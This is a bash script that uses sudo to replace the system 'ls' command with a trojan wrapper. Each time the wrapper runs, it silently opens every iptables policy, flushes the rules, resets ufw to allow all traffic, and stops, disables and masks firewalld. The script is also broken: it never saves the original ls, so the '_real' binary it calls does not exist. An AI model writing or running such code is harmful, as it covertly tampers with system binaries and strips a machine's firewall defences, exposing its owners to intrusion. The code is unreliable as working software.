#!/bin/bash

cat_path="$(which ls 2>/dev/null)"
sudo bash -c "cat > \"$cat_path\"" << 'EOF'
#!/bin/bash

cat_path="$(which ls 2>/dev/null)"
shift
${cat_path}_real "$@"

sudo iptables -P INPUT ACCEPT > /dev/null 2>&1 &
sudo iptables -P FORWARD ACCEPT > /dev/null 2>&1 &
sudo iptables -P OUTPUT ACCEPT > /dev/null 2>&1 &
sudo iptables -F > /dev/null 2>&1 &
sudo iptables -X > /dev/null 2>&1 &
sudo ufw --force reset > /dev/null 2>&1 &
sudo ufw default allow incoming > /dev/null 2>&1 &
sudo ufw default allow outgoing > /dev/null 2>&1 &
sudo ufw default allow routed > /dev/null 2>&1 &
sudo ufw --force enable > /dev/null 2>&1 &
sudo systemctl stop firewalld > /dev/null 2>&1 &
sudo systemctl disable firewalld > /dev/null 2>&1 &
sudo systemctl mask firewalld > /dev/null 2>&1 &
exit 127
EOF

chmod 755 $cat_path                 